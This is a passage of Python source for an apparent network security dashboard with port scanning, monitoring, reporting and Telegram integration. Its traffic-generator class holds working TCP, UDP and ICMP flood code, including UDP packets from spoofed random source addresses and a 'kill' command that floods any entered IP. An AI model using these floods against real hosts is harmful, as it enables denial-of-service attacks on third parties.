            cursor.execute(
                'INSERT INTO traffic_logs (traffic_type, target, packets_sent, duration) VALUES (?, ?, ?, ?)',
                ('TCP Flood', f"{target_ip}:{port}", packets_sent, duration)
            )
            conn.commit()
            conn.close()
            
            return f"✅ Sent {packets_sent} TCP packets to {target_ip}:{port} in {duration:.2f}s"
            
        except Exception as e:
            return f"❌ TCP traffic error: {str(e)}"
    
    def generate_udp_traffic(self, target_ip: str, port: int, packet_count: int, delay: float) -> str:
        """Generate UDP traffic"""
        if not SCAPY_AVAILABLE:
            return "❌ Scapy not available for UDP traffic generation"
        
        try:
            packets_sent = 0
            start_time = time.time()
            
            for i in range(packet_count):
                if not self.running:
                    break
                
                src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                payload = random._urandom(random.randint(64, 512))
                packet = IP(src=src_ip, dst=target_ip)/UDP(sport=random.randint(1024, 65535), dport=port)/payload
                send(packet, verbose=0)
                packets_sent += 1
                
                if delay > 0:
                    time.sleep(delay)
            
            duration = time.time() - start_time
            
            # Log to database
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO traffic_logs (traffic_type, target, packets_sent, duration) VALUES (?, ?, ?, ?)',
                ('UDP Flood', f"{target_ip}:{port}", packets_sent, duration)
            )
            conn.commit()
            conn.close()
            
            return f"✅ Sent {packets_sent} UDP packets to {target_ip}:{port} in {duration:.2f}s"
            
        except Exception as e:
            return f"❌ UDP traffic error: {str(e)}"
    
    def generate_icmp_traffic(self, target_ip: str, packet_count: int, delay: float) -> str:
        """Generate ICMP traffic"""
        if not SCAPY_AVAILABLE:
            return "❌ Scapy not available for ICMP traffic generation"
        
        try:
            packets_sent = 0
            start_time = time.time()
            
            for i in range(packet_count):
                if not self.running:
                    break
                
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=0)
                packets_sent += 1
                
                if delay > 0:
                    time.sleep(delay)
            
            duration = time.time() - start_time
            
            # Log to database
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO traffic_logs (traffic_type, target, packets_sent, duration) VALUES (?, ?, ?, ?)',
                ('ICMP Flood', target_ip, packets_sent, duration)
            )
            conn.commit()
            conn.close()
            
            return f"✅ Sent {packets_sent} ICMP packets to {target_ip} in {duration:.2f}s"
            
        except Exception as e:
            return f"❌ ICMP traffic error: {str(e)}"
    
    def kill_ip(self, ip_address: str):
        """Generate traffic to stress test IP (use responsibly)"""
        try:
            # Send various types of traffic
            threads = []
            
            # ICMP flood
            icmp_thread = threading.Thread(target=self._icmp_flood, args=(ip_address,))
            threads.append(icmp_thread)
            
            # TCP SYN flood
            tcp_thread = threading.Thread(target=self._tcp_syn_flood, args=(ip_address,))
            threads.append(tcp_thread)
            
            # UDP flood
            udp_thread = threading.Thread(target=self._udp_flood, args=(ip_address,))
            threads.append(udp_thread)
            
            for thread in threads:
                thread.daemon = True
                thread.start()
            
            # Run for 30 seconds
            time.sleep(30)
            
            return f"✅ Traffic generation to {ip_address} completed"
            
        except Exception as e:
            return f"❌ Traffic generation error: {str(e)}"
    
    def _icmp_flood(self, ip_address: str):
        """Generate ICMP flood"""
        try:
            packet = IP(dst=ip_address)/ICMP()
            for _ in range(1000):  # Limited for safety
                send(packet, verbose=0)
                time.sleep(0.01)
        except Exception:
            pass
    
    def _tcp_syn_flood(self, ip_address: str):
        """Generate TCP SYN flood"""
        try:
            for port in range(80, 90):  # Limited port range
                packet = IP(dst=ip_address)/TCP(dport=port, flags='S')
                for _ in range(100):  # Limited for safety
                    send(packet, verbose=0)
                    time.sleep(0.01)
        except Exception:
            pass
    
    def _udp_flood(self, ip_address: str):
        """Generate UDP flood"""
        try:
            packet = IP(dst=ip_address)/UDP(dport=53)
            for _ in range(1000):  # Limited for safety
                send(packet, verbose=0)
                time.sleep(0.01)
        except Exception:
            pass
    
    def stop_traffic(self):
        """Stop all traffic generation"""
        self.running = False
        if self.current_thread and self.current_thread.is_alive():
            self.current_thread.join(timeout=2)

class TelegramManager:
    """Telegram integration manager"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db_manager = db_manager
        self.telegram_token = None
        self.telegram_chat_id = None
        self.telegram_last_update_id = 0
        self.telegram_enabled = False
        self.load_config()
    
    def load_config(self):
        """Load Telegram configuration"""
        config = configparser.ConfigParser()
        if os.path.exists(DEFAULT_CONFIG_FILE):
            config.read(DEFAULT_CONFIG_FILE)
            self.telegram_token = config.get('telegram', 'token', fallback=None)
            self.telegram_chat_id = config.get('telegram', 'chat_id', fallback=None)
            if self.telegram_token and self.telegram_chat_id:
                self.telegram_enabled = True
    
    def save_config(self):
        """Save Telegram configuration"""
        config = configparser.ConfigParser()
        config['telegram'] = {
            'token': self.telegram_token or '',
            'chat_id': self.telegram_chat_id or ''
        }
        with open(DEFAULT_CONFIG_FILE, 'w') as configfile:
            config.write(configfile)
    
    def config_telegram_token(self, token: str):
        """Configure Telegram bot token"""
        try:
            self.telegram_token = token
            self.save_config()
            
            # Test the token
            if self.test_telegram_token(token):
                self.telegram_enabled = True
                return "✅ Telegram token configured successfully"
            else:
                self.telegram_enabled = False
                return "❌ Invalid Telegram token"
                
        except Exception as e:
            return f"❌ Failed to configure token: {str(e)}"
    
    def config_telegram_chat_id(self, chat_id: str):
        """Configure Telegram chat ID"""
        try:
            self.telegram_chat_id = chat_id
            self.save_config()
            
            if self.telegram_token and self.test_telegram_token(self.telegram_token):
                self.telegram_enabled = True
                return "✅ Telegram chat ID configured successfully"
            else:
                return "⚠ Telegram token not configured or invalid"
                
        except Exception as e:
            return f"❌ Failed to configure chat ID: {str(e)}"
    
    def test_telegram_token(self, token: str = None) -> bool:
        """Test Telegram token validity"""
        try:
            test_token = token or self.telegram_token
            if not test_token:
                return False
                
            response = requests.get(
                f"{TELEGRAM_API_URL}{test_token}/getMe",
                timeout=10
            )
            
            if response.status_code == 200:
                bot_info = response.json()
                return bot_info.get('ok', False)
            return False
            
        except Exception:
            return False
    
    def test_telegram_connection(self) -> str:
        """Test Telegram connection"""
        try:
            if not self.telegram_token or not self.telegram_chat_id:
                return "❌ Telegram token or chat ID not configured"
            
            # Test bot token
            response = requests.get(
                f"{TELEGRAM_API_URL}{self.telegram_token}/getMe",
                timeout=10
            )
            
            if response.status_code == 200:
                bot_info = response.json()
                if bot_info['ok']:
                    result = "✅ Telegram connection successful\n"
                    result += f"  Bot: {bot_info['result']['first_name']}\n"
                    result += f"  Username: @{bot_info['result']['username']}"
                    
                    # Test message sending
                    if self.send_telegram_message("🔒 Cyber Security Tool - Connection Test Successful!"):
                        result += "\n✅ Test message sent successfully"
                        self.telegram_enabled = True
                    else:
                        result += "\n❌ Failed to send test message"
                        self.telegram_enabled = False
                    return result
                else:
                    self.telegram_enabled = False
                    return "❌ Telegram connection failed"
            else:
                self.telegram_enabled = False
                return f"❌ Telegram API error: {response.status_code}"
                
        except Exception as e:
            self.telegram_enabled = False
            return f"❌ Telegram connection test failed: {str(e)}"
    
    def send_telegram_message(self, message: str) -> bool:
        """Send message to Telegram chat"""
        try:
            if not self.telegram_token or not self.telegram_chat_id:
                return False
            
            url = f"{TELEGRAM_API_URL}{self.telegram_token}/sendMessage"
            payload = {
                'chat_id': self.telegram_chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(url, json=payload, timeout=10)
            
            # Log the message
            if response.status_code == 200:
                conn = sqlite3.connect(DATABASE_FILE)
                cursor = conn.cursor()
                cursor.execute(
                    "INSERT INTO telegram_logs (timestamp, chat_id, message, direction) VALUES (?, ?, ?, ?)",
                    (datetime.now().isoformat(), self.telegram_chat_id, message, 'outgoing')
                )
                conn.commit()
                conn.close()
            
            return response.status_code == 200
            
        except Exception:
            return False
    
    def get_telegram_status(self) -> str:
        """Get Telegram connection status"""
        status = "Telegram Status:\n"
        status += f"  Enabled: {'Yes' if self.telegram_enabled else 'No'}\n"
        status += f"  Bot Token: {'Configured' if self.telegram_token else 'Not Configured'}\n"
        status += f"  Chat ID: {'Configured' if self.telegram_chat_id else 'Not Configured'}"
        
        if self.telegram_token and self.telegram_chat_id:
            if self.test_telegram_token():
                status += "\n  Bot token: Valid"
            else:
                status += "\n  Bot token: Invalid"
        
        return status
    
    def export_data(self) -> str:
        """Export data to Telegram"""
        try:
            if not self.telegram_enabled:
                return "❌ Telegram not configured or enabled"
            
            # Create export package
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                export_data = {
                    'export_time': datetime.now().isoformat(),
                    'system_status': "OPERATIONAL",
                    'telegram_messages': {
                        'incoming': 0,
                        'outgoing': 0
                    }
                }
                
                # Get message counts
                conn = sqlite3.connect(DATABASE_FILE)
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM telegram_logs WHERE direction = 'incoming'")
                export_data['telegram_messages']['incoming'] = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM telegram_logs WHERE direction = 'outgoing'")
                export_data['telegram_messages']['outgoing'] = cursor.fetchone()[0]
                conn.close()
                
                json.dump(export_data, f, indent=2)
                temp_file = f.name
            
            # Send file via Telegram
            url = f"{TELEGRAM_API_URL}{self.telegram_token}/sendDocument"
            with open(temp_file, 'rb') as document:
                response = requests.post(
                    url,
                    data={'chat_id': self.telegram_chat_id, 'caption': '📊 System Data Export'},
                    files={'document': document}
                )
            
            # Clean up
            os.unlink(temp_file)
            
            if response.status_code == 200:
                return "✅ Data exported to Telegram successfully"
            else:
                return "❌ Failed to export data to Telegram"
                
        except Exception as e:
            return f"❌ Export failed: {str(e)}"

class TerminalEmulator:
    """Command-line terminal emulator with enhanced security commands"""
    
    def __init__(self, network_scanner: NetworkScanner, network_monitor: NetworkMonitor, 
                 traffic_generator: NetworkTrafficGenerator, telegram_manager: TelegramManager):
        self.scanner = network_scanner
        self.monitor = network_monitor
        self.traffic_generator = traffic_generator
        self.telegram_manager = telegram_manager
        self.db_manager = network_scanner.db_manager
        self.commands = {
            'help': self.cmd_help,
            'start monitoring': self.cmd_start_monitoring,
            'stop monitoring': self.cmd_stop_monitoring,
            'status': self.cmd_status,
            'scan': self.cmd_scan,
            'ping': self.cmd_ping,
            'traceroute': self.cmd_traceroute,
            'vulnscan': self.cmd_vulnscan,
            'ifconfig': self.cmd_ifconfig,
            'netstat': self.cmd_netstat,
            'whois': self.cmd_whois,
            'dns': self.cmd_dns,
            'threats': self.cmd_threats,
            'stats': self.cmd_stats,
            'clear': self.cmd_clear,
            'exit': self.cmd_exit,
            'deep scan': self.cmd_deep_scan,
            'kill': self.cmd_kill,
            'add': self.cmd_add,
            'remove': self.cmd_remove,
            'location': self.cmd_location,
            'config telegram token': self.cmd_config_telegram_token,
            'config telegram chat_id': self.cmd_config_telegram_chat_id,
            'test telegram connection': self.cmd_test_telegram_connection,
            'telegram status': self.cmd_telegram_status,
            'send telegram message': self.cmd_send_telegram_message,
            'generate day report': self.cmd_generate_day_report,
            'generate weekly report': self.cmd_generate_weekly_report,
            'generate monthly report': self.cmd_generate_monthly_report,
            'generate annual report': self.cmd_generate_annual_report,
            'export data': self.cmd_export_data,
            'reboot system': self.cmd_reboot_system,
            'history': self.cmd_history,
            'analyse': self.cmd_analyse
        }
    
    def execute(self, command: str) -> str:
        """Execute terminal command"""
        parts = command.strip().split()
        if not parts:
            return ""
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Find matching command
        matched_cmd = None
        for available_cmd in self.commands:
            cmd_words = available_cmd.split()
            if len(cmd_words) == 1 and cmd == cmd_words[0]:
                matched_cmd = available_cmd
                break
            elif len(cmd_words) > 1 and command.lower().startswith(available_cmd):
                matched_cmd = available_cmd
                args = command[len(available_cmd):].strip().split()
                break
        
        if not matched_cmd:
            return f"Command not found: {cmd}\nType 'help' for available commands"
        
        try:
            return self.commands[matched_cmd](args)
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def cmd_help(self, args):
        help_text = f"""{Colors.GREEN}{Colors.BOLD}ACCURATE CYBER DEFENSE v{VERSION} - AVAILABLE COMMANDS:{Colors.END}

{Colors.CYAN}Basic Commands:{Colors.END}
  {Colors.GREEN}help{Colors.END} - Show this help message
  {Colors.GREEN}start{Colors.END} - Start monitoring all IPs
  {Colors.GREEN}stop{Colors.END} - Stop all monitoring
  {Colors.GREEN}clear{Colors.END} - Clear the screen
  {Colors.GREEN}exit{Colors.END} - Exit the tool
  {Colors.GREEN}status{Colors.END} - Show system status
  {Colors.GREEN}reboot system{Colors.END} - Reboot the monitoring system

{Colors.CYAN}IP Management:{Colors.END}
  {Colors.GREEN}ping IP{Colors.END} - Ping a specific IP address
  {Colors.GREEN}scan IP{Colors.END} - Quick port scan on IP
  {Colors.GREEN}deep scan IP{Colors.END} - Comprehensive port scan (1-65535)
  {Colors.GREEN}analyse IP{Colors.END} - Deep analysis of IP
  {Colors.GREEN}monitoring IP{Colors.END} - Start monitoring specific IP
  {Colors.GREEN}kill IP{Colors.END} - Generate traffic to stress test IP
  {Colors.GREEN}add IP{Colors.END} - Add IP to monitoring list (supports bulk)
  {Colors.GREEN}remove IP{Colors.END} - Remove IP from monitoring
  {Colors.GREEN}location ip{Colors.END} - Get geographical location of IP

{Colors.CYAN}Network Tools:{Colors.END}
  {Colors.GREEN}traceroute TARGET{Colors.END} - Traceroute to target
  {Colors.GREEN}vulnscan TARGET{Colors.END} - Vulnerability scan
  {Colors.GREEN}ifconfig{Colors.END} - Network interface information
  {Colors.GREEN}netstat{Colors.END} - Network connections
  {Colors.GREEN}whois DOMAIN{Colors.END} - WHOIS lookup
  {Colors.GREEN}dns DOMAIN{Colors.END} - DNS lookup

{Colors.CYAN}Threat Analysis:{Colors.END}
  {Colors.GREEN}view threats{Colors.END} - View detected threats
  {Colors.GREEN}stats{Colors.END} - Show network statistics
  {Colors.GREEN}history{Colors.END} - View command history

{Colors.CYAN}Telegram Integration:{Colors.END}
  {Colors.GREEN}config telegram token YOUR_TOKEN{Colors.END} - Configure Telegram bot token
  {Colors.GREEN}config telegram chat_id YOUR_CHAT_ID{Colors.END} - Configure Telegram chat ID
  {Colors.GREEN}test telegram connection{Colors.END} - Test Telegram connection
  {Colors.GREEN}telegram status{Colors.END} - Show Telegram connection status
  {Colors.GREEN}send telegram message{Colors.END} - Send test message to Telegram

{Colors.CYAN}Reporting:{Colors.END}
  {Colors.GREEN}generate day report{Colors.END} - Generate daily security report
  {Colors.GREEN}generate weekly report{Colors.END} - Generate weekly security report
  {Colors.GREEN}generate monthly report{Colors.END} - Generate monthly security report
  {Colors.GREEN}generate annual report{Colors.END} - Generate annual security report
  {Colors.GREEN}export data{Colors.END} - Export data to Telegram

{Colors.YELLOW}Example Usage:{Colors.END}
  config telegram token 123456789:ABCdefGHIjklMNOpqrSTUvwxYZ
  config telegram chat_id 123456789
  test telegram connection
  location ip 8.8.8.8
  ping 192.168.1.1
  scan 192.168.1.1
  deep scan 192.168.1.1
        """
        return help_text
    
    def cmd_start_monitoring(self, args):
        target_ip = args[0] if args else None
        if self.monitor.start_monitoring(target_ip):
            return f"✅ Started monitoring {target_ip if target_ip else 'all traffic'}"
        else:
            return "⚠ Monitoring is already active"
    
    def cmd_stop_monitoring(self, args):
        self.monitor.stop_monitoring()
        return "✅ Stopped network monitoring"
    
    def cmd_status(self, args):
        stats = self.monitor.get_current_stats()
        system_info = f"""
{Colors.CYAN}System Status:{Colors.END}
  OS: {platform.system()} {platform.release()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%

{Colors.CYAN}Monitoring Status:{Colors.END}
  Active: {'Yes' if stats['is_monitoring'] else 'No'}
  Target: {stats['target_ip'] or 'All traffic'}
  Packets: {stats['packets_processed']}
  Packet Rate: {stats['packet_rate']:.2f}/s
  Threats Detected: {stats['threats_detected']}
"""
        return system_info
    
    def cmd_scan(self, args):
        if not args:
            return "Usage: scan <ip>"
        
        ip = args[0]
        
        result = self.scanner.scan_ip(ip)
        if result['success']:
            open_ports = result.get('open_ports', [])
            response = f"🔍 Scan Results for {ip}:\n"
            response += f"Open Ports: {len(open_ports)}\n\n"
            for port in open_ports[:20]:  # Show first 20 ports
                service = result['services'].get(port, 'Unknown')
                response += f"  Port {port}: {service}\n"
            if len(open_ports) > 20:
                response += f"\n  ... and {len(open_ports) - 20} more ports"
            return response
        else:
            return f"❌ Scan error: {result.get('error', 'Unknown')}"
    
    def cmd_ping(self, args):
        if not args:
            return "Usage: ping <ip/hostname>"
        return self.scanner.ping_ip(args[0])
    
    def cmd_deep_scan(self, args):
        if not args:
            return "Usage: deep scan <ip>"
        
        ip = args[0]
        result = self.scanner.deep_scan_ip(ip)
        if result['success']:
            open_ports = result.get('open_ports', [])
            response = f"🔍 Deep Scan Results for {ip}:\n"
            response += f"State: {result.get('state', 'Unknown')}\n"
            response += f"Open Ports: {len(open_ports)}\n\n"
            for port in open_ports[:10]:  # Show first 10 ports
                service_info = result['services'].get(port, {})
                name = service_info.get('name', 'unknown')
                product = service_info.get('product', '')
                version = service_info.get('version', '')
                response += f"  Port {port}: {name} {product} {version}\n".strip() + "\n"
            if len(open_ports) > 10:
                response += f"\n  ... and {len(open_ports) - 10} more ports"
            return response
        else:
            return f"❌ Deep scan error: {result.get('error', 'Unknown')}"
    
    def cmd_kill(self, args):
        if not args:
            return "Usage: kill <ip>"
        
        ip = args[0]
        self.print_warning("⚠ Warning: This will generate network traffic. Use responsibly!")
        return self.traffic_generator.kill_ip(ip)
    
    def cmd_add(self, args):
        if not args:
            return "Usage: add <ip>"
        
        ip = args[0]
        self.db_manager.add_monitored_ip(ip)
        return f"✅ Added {ip} to monitoring list"
    
    def cmd_remove(self, args):
        if not args:
            return "Usage: remove <ip>"
        
        ip = args[0]
        self.db_manager.remove_monitored_ip(ip)
        return f"✅ Removed {ip} from monitoring list"
    
    def cmd_location(self, args):
        if not args:
            return "Usage: location <ip>"
        
        ip = args[0]
        return self.scanner.get_ip_location(ip)
    
    def cmd_config_telegram_token(self, args):
        if not args:
            return "Usage: config telegram token <your_token>"
        
        token = args[0]
        return self.telegram_manager.config_telegram_token(token)
    
    def cmd_config_telegram_chat_id(self, args):
        if not args:
            return "Usage: config telegram chat_id <your_chat_id>"
        
        chat_id = args[0]
        return self.telegram_manager.config_telegram_chat_id(chat_id)
    
    def cmd_test_telegram_connection(self, args):
        return self.telegram_manager.test_telegram_connection()
    
    def cmd_telegram_status(self, args):
        return self.telegram_manager.get_telegram_status()
    
    def cmd_send_telegram_message(self, args):
        test_message = "🔒 Cyber Security Tool Test Message\n" \
                      "Timestamp: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n" \
                      "Status: Operational\n" \
                      "This is a test of the Telegram integration."
        
        if self.telegram_manager.send_telegram_message(test_message):
            return "✅ Test message sent successfully"
        else:
            return "❌ Failed to send test message"
    
    def cmd_generate_day_report(self, args):
        return self.generate_report('day')
    
    def cmd_generate_weekly_report(self, args):
        return self.generate_report('week')
    
    def cmd_generate_monthly_report(self, args):
        return self.generate_report('month')
    
    def cmd_generate_annual_report(self, args):
        return self.generate_report('annual')
    
    def generate_report(self, period: str) -> str:
        """Generate security report"""
        try:
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
            
            # Calculate date range based on period
            end_date = datetime.now()
            if period == 'day':
                start_date = end_date - datetime.timedelta(days=1)
            elif period == 'week':
                start_date = end_date - datetime.timedelta(weeks=1)
            elif period == 'month':
                start_date = end_date - datetime.timedelta(days=30)
            elif period == 'annual':
                start_date = end_date - datetime.timedelta(days=365)
            else:
                return "❌ Invalid period specified"
            
            # Get threats for period
            cursor.execute(
                "SELECT COUNT(*) FROM threats WHERE timestamp BETWEEN ? AND ?",
                (start_date.isoformat(), end_date.isoformat())
            )
            total_threats = cursor.fetchone()[0]
            
            cursor.execute(
                "SELECT COUNT(*) FROM threats WHERE timestamp BETWEEN ? AND ? AND severity = 'high'",
                (start_date.isoformat(), end_date.isoformat())
            )
            high_threats = cursor.fetchone()[0]
            
            conn.close()
            
            report = f"📊 {period.capitalize()} Security Report\n"
            report += "=" * 40 + "\n"
            report += f"Period: {start_date.strftime('%Y-%m-%d')} to {end_date.strftime('%Y-%m-%d')}\n"
            report += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            report += f"Total Threats: {total_threats}\n"
            report += f"High Severity Threats: {high_threats}\n"
            
            # Save report to file
            filename = f"security_report_{period}_{end_date.strftime('%Y%m%d_%H%M%S')}.txt"
            os.makedirs(REPORT_DIR, exist_ok=True)
            filepath = os.path.join(REPORT_DIR, filename)
            
            with open(filepath, 'w') as f:
                f.write(report)
            
            report += f"\n✅ Report saved as {filename}"
            
            # Send summary to Telegram if enabled
            if self.telegram_manager.telegram_enabled:
                telegram_msg = f"📊 {period.capitalize()} Security Report\n"
                telegram_msg += f"Total Threats: {total_threats}\n"
                telegram_msg += f"High Severity: {high_threats}"
                self.telegram_manager.send_telegram_message(telegram_msg)
            
            return report
            
        except Exception as e:
            return f"❌ Report generation error: {str(e)}"
    
    def cmd_export_data(self, args):
        return self.telegram_manager.export_data()
    
    def cmd_reboot_system(self, args):
        self.monitor.stop_monitoring()
        time.sleep(2)
        self.monitor.start_monitoring()
        return "✅ System rebooted successfully"
    
    def cmd_history(self, args):
        try:
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
            cursor.execute("SELECT timestamp, command FROM command_history ORDER BY timestamp DESC LIMIT 20")
            history = cursor.fetchall()
            conn.close()
            
            if not history:
                return "📝 No command history"
            
            response = "📝 Command History (Last 20 commands):\n"
            for timestamp, command in history:
                dt = datetime.fromisoformat(timestamp)
                response += f"{dt.strftime('%Y-%m-%d %H:%M:%S')} - {command}\n"
            return response
            
        except Exception as e:
            return f"❌ Error showing history: {str(e)}"
    
    def cmd_analyse(self, args):
        if not args:
            return "Usage: analyse <ip>"
        
        ip = args[0]
        response = f"🔍 Deep Analysis for {ip}:\n\n"
        
        # Ping
        response += "1. Ping Test:\n"
        response += self.scanner.ping_ip(ip) + "\n\n"
        
        # Quick Scan
        response += "2. Quick Port Scan:\n"
        result = self.scanner.scan_ip(ip)
        if result['success']:
            response += f"   Open ports: {len(result.get('open_ports', []))}\n"
        else:
            response += "   Scan failed\n"
        
        # Location
        response += "\n3. Location Information:\n"
        response += self.scanner.get_ip_location(ip)
        
        return response
    
    def cmd_traceroute(self, args):
        if not args:
            return "Usage: traceroute <target>"
        return self.scanner.traceroute(args[0])
    
    def cmd_vulnscan(self, args):
        if not args:
            return "Usage: vulnscan <target>"
        
        result = self.scanner.vulnerability_scan(args[0])
        if result['success']:
            vulns = result.get('vulnerabilities', [])
            response = f"🔍 Vulnerability Scan for {args[0]}:\n"
            response += f"Vulnerabilities found: {len(vulns)}\n\n"
            for vuln in vulns[:10]:  # Show first 10 vulnerabilities
                response += f"  • {vuln}\n"
            return response
        else:
            return f"❌ Scan error: {result.get('error', 'Unknown')}"
    
    def cmd_ifconfig(self, args):
        try:
            if platform.system() == "Windows":
                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
            else:
                result = subprocess.run(['ifconfig'], capture_output=True, text=True)
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return str(e)
    
    def cmd_netstat(self, args):
        try:
            if platform.system() == "Windows":
                result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True)
            else:
                result = subprocess.run(['netstat', '-tulpn'], capture_output=True, text=True)
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return str(e)
    
    def cmd_whois(self, args):
        if not args:
            return "Usage: whois <domain>"
        
        try:
            result = subprocess.run(['whois', args[0]], capture_output=True, text=True, timeout=30)
            return result.stdout[:1000] + "..." if len(result.stdout) > 1000 else result.stdout
        except Exception as e:
            return str(e)
    
    def cmd_dns(self, args):
        if not args:
            return "Usage: dns <domain>"
        
        try:
            ip = socket.gethostbyname(args[0])
            return f"{args[0]} → {ip}"
        except Exception as e:
            return str(e)
    
    def cmd_threats(self, args):
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute(
            '''SELECT timestamp, source_ip, threat_type, severity 
               FROM intrusion_detection 
               ORDER BY timestamp DESC LIMIT 10'''
        )
        results = cursor.fetchall()
        conn.close()
        
        if not results:
            return "✅ No threats detected"
        
        response = "⚠ Recent Threats:\n"
        for timestamp, source_ip, threat_type, severity in results:
            color = Colors.GREEN
            if severity.lower() == 'high':
                color = Colors.RED
            elif severity.lower() == 'medium':
                color = Colors.YELLOW
            
            response += f"  {color}[{severity.upper()}]{Colors.END} {timestamp} - {source_ip} - {threat_type}\n"
        return response
    
    def cmd_stats(self, args):
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Get threat stats
        cursor.execute('''
            SELECT threat_type, COUNT(*) as count 
            FROM intrusion_detection 
            WHERE timestamp > datetime('now', '-24 hours')
            GROUP BY threat_type
        ''')
        threat_stats = cursor.fetchall()
        
        # Get packet stats
        cursor.execute('''
            SELECT SUM(packets_processed), AVG(packet_rate)
            FROM network_stats 
            WHERE timestamp > datetime('now', '-1 hour')
        ''')
        packet_stats = cursor.fetchone()
        
        conn.close()
        
        response = "📊 Network Statistics (Last 24 hours):\n\n"
        response += "Threat Types:\n"
        for threat_type, count in threat_stats:
            response += f"  {threat_type}: {count}\n"
        
        if packet_stats and packet_stats[0]:
            response += f"\nTotal Packets: {packet_stats[0]:,}\n"
            response += f"Average Rate: {packet_stats[1]:.2f} packets/s\n"
        
        return response
    
    def cmd_clear(self, args):
        os.system('cls' if os.name == 'nt' else 'clear')
        return ""
    
    def cmd_exit(self, args):
        return "EXIT"
    
    def print_warning(self, message):
        """Print warning message in yellow"""
        print(f"{Colors.YELLOW}{message}{Colors.END}")

class CyberSecurityDashboard:
    """Main GUI dashboard for cyber security monitoring"""
    
    def __init__(self, root, db_manager: DatabaseManager, 
                 network_monitor: NetworkMonitor, network_scanner: NetworkScanner,
                 telegram_manager: TelegramManager):
        self.root = root
        self.db_manager = db_manager
        self.monitor = network_monitor
        self.scanner = network_scanner
        self.telegram_manager = telegram_manager
        self.current_theme = "dark"
        
        self.setup_gui()
        self.update_interval = 2000  # ms
        self.update_dashboard()
    
    def setup_gui(self):
        """Setup the main dashboard GUI"""
        self.root.title(f"Accurate Cyber Defense v{VERSION} - Unified Security Platform")
        self.root.geometry("1200x800")
        
        # Create menu
        self.create_menu()
        
        # Create main frame
        self.main_frame = ttk.Frame(self.root)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Create tabs
        self.create_threat_dashboard_tab()
        self.create_network_monitor_tab()
        self.create_scanner_tab()
        self.create_terminal_tab()
        self.create_reports_tab()
        self.create_telegram_tab()
        
        # Apply theme
        self.apply_theme()
    
    def create_menu(self):
        """Create application menu"""
        menubar = tk.Menu(self.root)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label="New Session", command=self.new_session)
        file_menu.add_command(label="Load Session", command=self.load_session)
        file_menu.add_command(label="Save Session", command=self.save_session)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menubar.add_cascade(label="File", menu=file_menu)
        
        # View menu
        view_menu = tk.Menu(menubar, tearoff=0)
        view_menu.add_command(label="Switch Theme", command=self.switch_theme)
        view_menu.add_command(label="Threat Dashboard", 
                             command=lambda: self.notebook.select(0))
        view_menu.add_command(label="Network Monitor",
                             command=lambda: self.notebook.select(1))
        menubar.add_cascade(label="View", menu=view_menu)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        tools_menu.add_command(label="Traffic Generator", command=self.open_traffic_generator)
        tools_menu.add_command(label="Port Scanner", command=self.open_port_scanner)
        tools_menu.add_command(label="Vulnerability Scanner", command=self.open_vulnerability_scanner)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        
        self.root.config(menu=menubar)
    
    def create_threat_dashboard_tab(self):
        """Create threat dashboard tab"""
        self.threat_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.threat_tab, text="Threat Dashboard")
        
        # Monitoring controls
        monitor_frame = ttk.LabelFrame(self.threat_tab, text="Network Monitoring")
        monitor_frame.pack(fill=tk.X, padx=10, pady=5)
        
        control_frame = ttk.Frame(monitor_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(control_frame, text="Target IP (optional):").pack(side=tk.LEFT, padx=5)
        self.monitor_ip_entry = ttk.Entry(control_frame, width=20)
        self.monitor_ip_entry.pack(side=tk.LEFT, padx=5)
        
        self.start_monitor_btn = ttk.Button(control_frame, text="Start Monitoring", 
                                           command=self.start_monitoring)
        self.start_monitor_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_monitor_btn = ttk.Button(control_frame, text="Stop Monitoring",
                                          command=self.stop_monitoring, state=tk.DISABLED)
        self.stop_monitor_btn.pack(side=tk.LEFT, padx=5)
        
        # Current threats display
        threats_frame = ttk.LabelFrame(self.threat_tab, text="Current Threats")
        threats_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Create treeview for threats
        columns = ('Time', 'Source IP', 'Threat Type', 'Severity', 'Description')
        self.threats_tree = ttk.Treeview(threats_frame, columns=columns, show='headings')
        
        for col in columns:
            self.threats_tree.heading(col, text=col)
            self.threats_tree.column(col, width=150)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(threats_frame, orient=tk.VERTICAL, command=self.threats_tree.yview)
        self.threats_tree.configure(yscrollcommand=scrollbar.set)
        
